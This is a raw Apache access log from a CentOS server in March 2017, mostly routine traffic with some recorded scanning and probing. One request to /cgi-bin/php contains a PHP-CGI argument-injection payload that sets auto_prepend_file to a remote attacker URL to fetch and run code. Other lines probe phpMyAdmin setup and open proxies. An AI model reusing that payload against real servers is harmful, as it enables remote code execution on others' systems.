91.196.50.33 - - [23/Mar/2017:12:51:40 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
::1 - - [23/Mar/2017:12:56:12 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:12:56:12 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:12:56:12 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:12:56:12 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:12:56:12 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:03:18 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:03:18 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:03:18 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:03:18 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:03:18 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:03:18 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:13:03 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:13:03 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:13:03 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:13:03 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:13:13:03 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
2600:3c01::f03c:91ff:feac:3478 - - [23/Mar/2017:13:49:57 -0600] "GET /v1//users/1/boards HTTP/1.1" 500 - "-" "-"
2600:3c01::f03c:91ff:feac:3478 - - [23/Mar/2017:13:50:02 -0600] "GET /v1//users/1/boards HTTP/1.1" 500 - "-" "-"
144.38.238.197 - - [23/Mar/2017:13:50:53 -0600] "-" 408 - "-" "-"
144.38.238.197 - - [23/Mar/2017:13:50:53 -0600] "-" 408 - "-" "-"
144.38.238.197 - - [23/Mar/2017:13:50:53 -0600] "-" 408 - "-" "-"
185.169.230.8 - - [23/Mar/2017:19:54:55 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
185.169.230.8 - - [23/Mar/2017:23:02:16 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
185.169.230.8 - - [24/Mar/2017:01:01:23 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
191.96.249.97 - - [24/Mar/2017:02:00:48 -0600] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 226 "-" "-"
71.6.146.130 - - [24/Mar/2017:02:35:24 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
71.6.146.130 - - [24/Mar/2017:02:35:24 -0600] "GET /robots.txt HTTP/1.1" 404 208 "-" "-"
71.6.146.130 - - [24/Mar/2017:02:35:24 -0600] "GET /sitemap.xml HTTP/1.1" 404 209 "-" "-"
185.25.148.240 - - [24/Mar/2017:02:55:27 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
139.162.108.53 - - [24/Mar/2017:05:55:43 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
2600:3c01::f03c:91ff:feac:3478 - - [24/Mar/2017:08:53:23 -0600] "GET /v1//users/1/boards HTTP/1.1" 500 - "-" "-"
2600:3c01::f03c:91ff:feac:3478 - - [24/Mar/2017:08:53:30 -0600] "GET /v1//users/1/boards HTTP/1.1" 500 - "-" "-"
2600:3c01::f03c:91ff:feac:3478 - - [24/Mar/2017:08:53:46 -0600] "GET /v1//users/1/boards HTTP/1.1" 500 - "-" "-"
191.96.249.97 - - [24/Mar/2017:08:58:01 -0600] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D\"\"+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 404 209 "-" "-"
144.217.173.217 - - [24/Mar/2017:11:30:16 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
144.217.173.217 - - [24/Mar/2017:11:30:16 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
139.162.108.53 - - [24/Mar/2017:11:30:43 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
144.217.173.217 - - [24/Mar/2017:11:34:37 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
144.217.173.217 - - [24/Mar/2017:11:34:38 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
144.217.173.217 - - [24/Mar/2017:11:34:42 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
144.217.173.217 - - [24/Mar/2017:11:37:58 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
144.217.173.214 - - [24/Mar/2017:11:38:44 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
144.217.173.214 - - [24/Mar/2017:11:38:45 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
144.217.173.214 - - [24/Mar/2017:11:42:18 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
144.217.173.214 - - [24/Mar/2017:11:42:18 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
